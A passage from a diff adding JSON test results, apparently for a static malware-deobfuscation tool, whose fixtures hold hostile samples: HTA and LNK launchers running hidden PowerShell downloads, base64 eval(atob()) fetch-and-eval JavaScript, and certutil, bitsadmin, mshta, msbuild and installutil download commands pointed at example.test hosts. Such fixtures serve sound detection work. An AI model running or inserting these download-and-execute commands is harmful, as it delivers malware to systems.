+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 183,
+      "final_sha256": "ebc45269092373e38b52634225446d3f1f2da10d1e2cd6c84a970c57ffde4849",
+      "final_text": "<html><head><HTA:APPLICATION APPLICATIONNAME='X' /><script>new ActiveXObject('WScript.Shell').Run('powershell -w hidden -c iwr http://hta-3.example.test/stage')</script></head></html>",
+      "fixture_id": "corpus_hta_javascript_003",
+      "implementation": "reference",
+      "latency_ms": 0.013840966857969761,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 185,
+      "final_sha256": "aa0d16ca635d2b85b673c5032f0a8fed8c7b7d2202c3c83273f9bda2b4c18f78",
+      "final_text": "<html><head><HTA:APPLICATION APPLICATIONNAME='X' /><script>new ActiveXObject('WScript.Shell').Run('powershell -w hidden -c iwr http://hta-4.example.test/payload')</script></head></html>",
+      "fixture_id": "corpus_hta_javascript_004",
+      "implementation": "reference",
+      "latency_ms": 0.014854012988507748,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 184,
+      "final_sha256": "1144d40b37c42ba74638db1b0fc90a09c920772a38b84ccf4919bf044d7caba6",
+      "final_text": "<html><head><HTA:APPLICATION APPLICATIONNAME='X' /><script>new ActiveXObject('WScript.Shell').Run('powershell -w hidden -c iwr http://hta-5.example.test/loader')</script></head></html>",
+      "fixture_id": "corpus_hta_javascript_005",
+      "implementation": "reference",
+      "latency_ms": 0.013617041986435652,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 162,
+      "final_sha256": "121c3a6778efd8b9d45e948150088c30f9082f5ed55d7c4b90224c2427ee4f3f",
+      "final_text": "# ISO-mounted-LNK invocation (analyst extraction)\npowershell.exe -w hidden -c \"iwr http://iso-1.example.test/loader.exe -o $env:TEMP\\i.exe; start $env:TEMP\\i.exe\"",
+      "fixture_id": "corpus_iso_lnk_wrapper_001",
+      "implementation": "reference",
+      "latency_ms": 0.013613025657832623,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 160,
+      "final_sha256": "08393f0fcd86d00a684ecb27038a1bb7a170ae60251f026619d7e4cb69f8de7b",
+      "final_text": "# ISO-mounted-LNK invocation (analyst extraction)\npowershell.exe -w hidden -c \"iwr http://iso-2.example.test/next.exe -o $env:TEMP\\i.exe; start $env:TEMP\\i.exe\"",
+      "fixture_id": "corpus_iso_lnk_wrapper_002",
+      "implementation": "reference",
+      "latency_ms": 0.013689044862985611,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 160,
+      "final_sha256": "1dc7af42fd2efca6f29fd8dc1017aab70834e3ca1635fefa894c66eb68e93d0b",
+      "final_text": "# ISO-mounted-LNK invocation (analyst extraction)\npowershell.exe -w hidden -c \"iwr http://iso-3.example.test/drop.exe -o $env:TEMP\\i.exe; start $env:TEMP\\i.exe\"",
+      "fixture_id": "corpus_iso_lnk_wrapper_003",
+      "implementation": "reference",
+      "latency_ms": 0.013237004168331623,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 160,
+      "final_sha256": "404564e655d6f937bf4e5d236cf210a0f46918c2a36f4a58700c7e323de89d0c",
+      "final_text": "# ISO-mounted-LNK invocation (analyst extraction)\npowershell.exe -w hidden -c \"iwr http://iso-4.example.test/stub.exe -o $env:TEMP\\i.exe; start $env:TEMP\\i.exe\"",
+      "fixture_id": "corpus_iso_lnk_wrapper_004",
+      "implementation": "reference",
+      "latency_ms": 0.013580021914094687,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 161,
+      "final_sha256": "b441829c22c2c9651e9b93e30dd6a102547b5612e7229dd6c3131d0524fda397",
+      "final_text": "# ISO-mounted-LNK invocation (analyst extraction)\npowershell.exe -w hidden -c \"iwr http://iso-5.example.test/final.exe -o $env:TEMP\\i.exe; start $env:TEMP\\i.exe\"",
+      "fixture_id": "corpus_iso_lnk_wrapper_005",
+      "implementation": "reference",
+      "latency_ms": 0.020309991668909788,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 24,
+      "final_sha256": "d42fcbcda086d9721fe1672f64b961bd6509b58723f0691f25ebc80edd5b6040",
+      "final_text": "(('I','E','X') -join '')",
+      "fixture_id": "corpus_join_split_001",
+      "implementation": "reference",
+      "latency_ms": 0.002543965820223093,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 24,
+      "final_sha256": "32bc9b8e377bee9542bb019a61e75141b2ee4aeed9b5e7c8a42b178c1203a4bf",
+      "final_text": "(('c','m','d') -join '')",
+      "fixture_id": "corpus_join_split_002",
+      "implementation": "reference",
+      "latency_ms": 0.0025859917514026165,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 28,
+      "final_sha256": "0e2ab649cdf120ab139bba53243abbbe57756fa547ee8b7d1124c97ebc4b9496",
+      "final_text": "(('c','u','r','l') -join '')",
+      "fixture_id": "corpus_join_split_003",
+      "implementation": "reference",
+      "latency_ms": 0.0024649780243635178,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 28,
+      "final_sha256": "7c1b5931ad61f89e0c0deaa10c1decf3b4748db8151aefa374b510f855e1105f",
+      "final_text": "(('w','g','e','t') -join '')",
+      "fixture_id": "corpus_join_split_004",
+      "implementation": "reference",
+      "latency_ms": 0.0023569446057081223,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 32,
+      "final_sha256": "fcd6d12beb03d56c50487d8b532036bb49aa8beb4b60439a8312dd0db74c00fd",
+      "final_text": "(('m','s','h','t','a') -join '')",
+      "fixture_id": "corpus_join_split_005",
+      "implementation": "reference",
+      "latency_ms": 0.0026400084607303143,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 110,
+      "final_sha256": "b44ede732e74a61486abcca164644b8b2cb75bf732620fd335156dd335fcc1e8",
+      "final_text": "eval(atob('ZmV0Y2goJ2h0dHA6Ly9qc2V2LTEuZXhhbXBsZS50ZXN0L2xvYWRlcicpLnRoZW4ocj0+ci50ZXh0KCkpLnRoZW4oZXZhbCk='))",
+      "fixture_id": "corpus_js_eval_atob_001",
+      "implementation": "reference",
+      "latency_ms": 0.007077993359416723,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 106,
+      "final_sha256": "718f4f5368c1c15fe72ebeed9a891056b4e50d8e6acd47e3a5438f60d7fe1e23",
+      "final_text": "eval(atob('ZmV0Y2goJ2h0dHA6Ly9qc2V2LTIuZXhhbXBsZS50ZXN0L3N0dWInKS50aGVuKHI9PnIudGV4dCgpKS50aGVuKGV2YWwp'))",
+      "fixture_id": "corpus_js_eval_atob_002",
+      "implementation": "reference",
+      "latency_ms": 0.006659014616161585,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 110,
+      "final_sha256": "30c114f348c7405fd7c70d0beb59972785ff9ea33deb083fc62d1ea5332647af",
+      "final_text": "eval(atob('ZmV0Y2goJ2h0dHA6Ly9qc2V2LTMuZXhhbXBsZS50ZXN0L2JlYWNvbicpLnRoZW4ocj0+ci50ZXh0KCkpLnRoZW4oZXZhbCk='))",
+      "fixture_id": "corpus_js_eval_atob_003",
+      "implementation": "reference",
+      "latency_ms": 0.006644986569881439,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 110,
+      "final_sha256": "84a88847d5e6fc28458372ef542ac991bf666ce89df61c453f7d40c201110aac",
+      "final_text": "eval(atob('ZmV0Y2goJ2h0dHA6Ly9qc2V2LTQuZXhhbXBsZS50ZXN0L2V4ZmlsJykudGhlbihyPT5yLnRleHQoKSkudGhlbihldmFsKQ=='))",
+      "fixture_id": "corpus_js_eval_atob_004",
+      "implementation": "reference",
+      "latency_ms": 0.006559013854712248,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 110,
+      "final_sha256": "a2b0ac26f0028d1cf453a88d42cbb5408904554e359130c94824e03b85ace373",
+      "final_text": "eval(atob('ZmV0Y2goJ2h0dHA6Ly9qc2V2LTUuZXhhbXBsZS50ZXN0L3BheWxvYWQnKS50aGVuKHI9PnIudGV4dCgpKS50aGVuKGV2YWwp'))",
+      "fixture_id": "corpus_js_eval_atob_005",
+      "implementation": "reference",
+      "latency_ms": 0.0065820058807730675,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 150,
+      "final_sha256": "85dd562b91f23b61bccd6d1a84d1b11bb454dc0af9487c107460acb26dcf3b65",
+      "final_text": "C:\\Windows\\System32\\cmd.exe /c start /min powershell -w hidden -c \"iwr 'http://lnk-1.example.test/stub.exe' -o $env:TEMP\\s.exe; start $env:TEMP\\s.exe\"",
+      "fixture_id": "corpus_lnk_launcher_001",
+      "implementation": "reference",
+      "latency_ms": 0.013432989362627268,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 150,
+      "final_sha256": "e6dd9ba46da23bae039425f7c9bba519ef038f757f1100ef6bf214b31866068d",
+      "final_text": "C:\\Windows\\System32\\cmd.exe /c start /min powershell -w hidden -c \"iwr 'http://lnk-2.example.test/next.exe' -o $env:TEMP\\s.exe; start $env:TEMP\\s.exe\"",
+      "fixture_id": "corpus_lnk_launcher_002",
+      "implementation": "reference",
+      "latency_ms": 0.012714008335024118,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 148,
+      "final_sha256": "9ea0bae8315415ac7a032a835ff5528a22e6912dc0334d9f4cd6c607c45ef0c4",
+      "final_text": "C:\\Windows\\System32\\cmd.exe /c start /min powershell -w hidden -c \"iwr 'http://lnk-3.example.test/rt.exe' -o $env:TEMP\\s.exe; start $env:TEMP\\s.exe\"",
+      "fixture_id": "corpus_lnk_launcher_003",
+      "implementation": "reference",
+      "latency_ms": 0.012604985386133194,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 147,
+      "final_sha256": "d5012b5604a1d0cf5083fc70d497033e859db462929c0cadd72d0137578fba5d",
+      "final_text": "C:\\Windows\\System32\\cmd.exe /c start /min powershell -w hidden -c \"iwr 'http://lnk-4.example.test/z.exe' -o $env:TEMP\\s.exe; start $env:TEMP\\s.exe\"",
+      "fixture_id": "corpus_lnk_launcher_004",
+      "implementation": "reference",
+      "latency_ms": 0.01322402385994792,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 147,
+      "final_sha256": "831ce0dad5cfc96d8b026d21150a87af2aab0028f4b2c4a7ab775bb732fdbf90",
+      "final_text": "C:\\Windows\\System32\\cmd.exe /c start /min powershell -w hidden -c \"iwr 'http://lnk-5.example.test/p.exe' -o $env:TEMP\\s.exe; start $env:TEMP\\s.exe\"",
+      "fixture_id": "corpus_lnk_launcher_005",
+      "implementation": "reference",
+      "latency_ms": 0.013170007150620222,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 94,
+      "final_sha256": "4a26618065ee6e3e46f9469edab85ce98f7b45a83a1ccf6d5da2622c8776e0b4",
+      "final_text": "bitsadmin /transfer job1 /priority normal http://bits-1.example.test/j1.exe %TEMP%\\payload.exe",
+      "fixture_id": "corpus_lolbas_bitsadmin_001",
+      "implementation": "reference",
+      "latency_ms": 0.006053014658391476,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 94,
+      "final_sha256": "398d4b50846aa3ff8c453453a9af831d8cc437012bb2a6e5b4b94bebea78bc01",
+      "final_text": "bitsadmin /transfer job1 /priority normal http://bits-2.example.test/j2.exe %TEMP%\\payload.exe",
+      "fixture_id": "corpus_lolbas_bitsadmin_002",
+      "implementation": "reference",
+      "latency_ms": 0.006254005711525679,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 94,
+      "final_sha256": "174153e7086306e6f31d99c41939979eab0c8f8fb78e8a9cf412e440db427543",
+      "final_text": "bitsadmin /transfer job1 /priority normal http://bits-3.example.test/j3.exe %TEMP%\\payload.exe",
+      "fixture_id": "corpus_lolbas_bitsadmin_003",
+      "implementation": "reference",
+      "latency_ms": 0.006228976417332888,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 94,
+      "final_sha256": "2cadc7d8144f83b3033310310214693506818e4e4e035b5e4bccf40bc03f19ec",
+      "final_text": "bitsadmin /transfer job1 /priority normal http://bits-4.example.test/j4.exe %TEMP%\\payload.exe",
+      "fixture_id": "corpus_lolbas_bitsadmin_004",
+      "implementation": "reference",
+      "latency_ms": 0.005859008524566889,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 94,
+      "final_sha256": "75e3f0f3e126e0616a46f05214adbbcc7e0f81a57ef8fee9e2304ccf19f0d4f3",
+      "final_text": "bitsadmin /transfer job1 /priority normal http://bits-5.example.test/j5.exe %TEMP%\\payload.exe",
+      "fixture_id": "corpus_lolbas_bitsadmin_005",
+      "implementation": "reference",
+      "latency_ms": 0.00580295454710722,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 83,
+      "final_sha256": "fd7faf313f68537401da516ff787a717facef4acf4a60d7269e5bfae57c1e8f8",
+      "final_text": "certutil.exe -urlcache -split -f http://cutl-1.example.test/dropper.exe dropper.exe",
+      "fixture_id": "corpus_lolbas_certutil_001",
+      "implementation": "reference",
+      "latency_ms": 0.005169014912098646,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 82,
+      "final_sha256": "ff4ae360dfc2f401bfe40e8779659862114680273e469ac2ba7f0381a247f751",
+      "final_text": "certutil.exe -urlcache -split -f http://cutl-2.example.test/beacon.exe dropper.exe",
+      "fixture_id": "corpus_lolbas_certutil_002",
+      "implementation": "reference",
+      "latency_ms": 0.004992994945496321,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 82,
+      "final_sha256": "30d58d08f021adddf9a5b3ec6a59066d3fa4c76b2926b9134579d8a308552317",
+      "final_text": "certutil.exe -urlcache -split -f http://cutl-3.example.test/stage2.bin dropper.exe",
+      "fixture_id": "corpus_lolbas_certutil_003",
+      "implementation": "reference",
+      "latency_ms": 0.005130015779286623,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 83,
+      "final_sha256": "600aff88061e4a1c5690254ee87f620b0359b9ac443de22adc39ae0753d23f46",
+      "final_text": "certutil.exe -urlcache -split -f http://cutl-4.example.test/payload.exe dropper.exe",
+      "fixture_id": "corpus_lolbas_certutil_004",
+      "implementation": "reference",
+      "latency_ms": 0.005293986760079861,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 80,
+      "final_sha256": "056bcae12679b43d3cb76e5857b55d8bc1b85ac6b709ff81a892e88908e99c7b",
+      "final_text": "certutil.exe -urlcache -split -f http://cutl-5.example.test/tool.exe dropper.exe",
+      "fixture_id": "corpus_lolbas_certutil_005",
+      "implementation": "reference",
+      "latency_ms": 0.005750975105911493,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 82,
+      "final_sha256": "930b5923c42058486d33bbec7a9f0d602f06b7f55c838d34f6a174b270d2052f",
+      "final_text": "installutil.exe /logfile= /LogToConsole=false /U http://iu-1.example.test/mod1.dll",
+      "fixture_id": "corpus_lolbas_installutil_001",
+      "implementation": "reference",
+      "latency_ms": 0.005250971298664808,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 82,
+      "final_sha256": "52a7c23990275eb84beeca72f361453a76a5da30e5dc7390b787ddf47de07085",
+      "final_text": "installutil.exe /logfile= /LogToConsole=false /U http://iu-2.example.test/mod2.dll",
+      "fixture_id": "corpus_lolbas_installutil_002",
+      "implementation": "reference",
+      "latency_ms": 0.005430018063634634,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 82,
+      "final_sha256": "c4a63faf152c7092e688e211a1b334ee3534480a38852fe3764d1839d37db4e7",
+      "final_text": "installutil.exe /logfile= /LogToConsole=false /U http://iu-3.example.test/mod3.dll",
+      "fixture_id": "corpus_lolbas_installutil_003",
+      "implementation": "reference",
+      "latency_ms": 0.005685025826096535,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 82,
+      "final_sha256": "15d4cf5b844811485240a6fea5189ddf76929c6c26a134d3c5e9803e28e7e991",
+      "final_text": "installutil.exe /logfile= /LogToConsole=false /U http://iu-4.example.test/mod4.dll",
+      "fixture_id": "corpus_lolbas_installutil_004",
+      "implementation": "reference",
+      "latency_ms": 0.00525603536516428,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 82,
+      "final_sha256": "cd974161adf475d8e90d9747b803410e636e42c4900f75213187e0ad46d62b71",
+      "final_text": "installutil.exe /logfile= /LogToConsole=false /U http://iu-5.example.test/mod5.dll",
+      "fixture_id": "corpus_lolbas_installutil_005",
+      "implementation": "reference",
+      "latency_ms": 0.005125009920448065,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 47,
+      "final_sha256": "0689c42b2e1f150de501dbc243b7e0017ef3a5d73023cb9ef23e505e012e4db5",
+      "final_text": "msbuild.exe http://msb-1.example.test/proj1.xml",
+      "fixture_id": "corpus_lolbas_msbuild_001",
+      "implementation": "reference",
+      "latency_ms": 0.0032929820008575916,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 47,
+      "final_sha256": "da729e84df7dec9c846a90f9504dbc130904ee882ea20c8ef5103bcf617b474d",
+      "final_text": "msbuild.exe http://msb-2.example.test/proj2.xml",
+      "fixture_id": "corpus_lolbas_msbuild_002",
+      "implementation": "reference",
+      "latency_ms": 0.003433029633015394,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 47,
+      "final_sha256": "fc43209820871aa49285da2de8a5ea098d47b4b6231a7f00007a73f411d37583",
+      "final_text": "msbuild.exe http://msb-3.example.test/proj3.xml",
+      "fixture_id": "corpus_lolbas_msbuild_003",
+      "implementation": "reference",
+      "latency_ms": 0.003263005055487156,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 47,
+      "final_sha256": "8c9c149725d4bbc277d74b2f95abe4637073bed4c6f8b32550757b48da661d10",
+      "final_text": "msbuild.exe http://msb-4.example.test/proj4.xml",
+      "fixture_id": "corpus_lolbas_msbuild_004",
+      "implementation": "reference",
+      "latency_ms": 0.0034580007195472717,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 47,
+      "final_sha256": "a5eeb4aa92b582acb66cf78565c8699d44ea6e0b2c0c00bebfa4e1c562b42e39",
+      "final_text": "msbuild.exe http://msb-5.example.test/proj5.xml",
+      "fixture_id": "corpus_lolbas_msbuild_005",
+      "implementation": "reference",
+      "latency_ms": 0.003190012648701668,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 43,
+      "final_sha256": "e69c81e40de2bf600d998476b9950c47279f31678bd1ba7d72906573d63b34c2",
+      "final_text": "mshta.exe http://mshta-1.example.test/a.hta",
+      "fixture_id": "corpus_lolbas_mshta_001",
+      "implementation": "reference",
+      "latency_ms": 0.0030240043997764587,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 43,
+      "final_sha256": "a69fac84c3fb4750eadf9b5af923ec9314e0cba9abdd8a2326c591d3ef553402",
+      "final_text": "mshta.exe http://mshta-2.example.test/b.hta",
+      "fixture_id": "corpus_lolbas_mshta_002",
+      "implementation": "reference",
+      "latency_ms": 0.0033469987101852894,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 44,
+      "final_sha256": "6c9792fada0bf078aa6b2cbfc205348c8207733e5c05d80affa2d16275fc52ca",
+      "final_text": "mshta.exe https://mshta-3.example.test/c.hta",
+      "fixture_id": "corpus_lolbas_mshta_003",
+      "implementation": "reference",
+      "latency_ms": 0.003075983840972185,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 43,
+      "final_sha256": "707256075da0af8ef5d0bc2c83c1e5ecd6b19458e406e1623cc0edbf5954db58",
+      "final_text": "mshta.exe http://mshta-4.example.test/d.hta",
+      "fixture_id": "corpus_lolbas_mshta_004",
+      "implementation": "reference",
+      "latency_ms": 0.003086053766310215,
+      "layer_count": 0,
+      "layer_sequence": [],
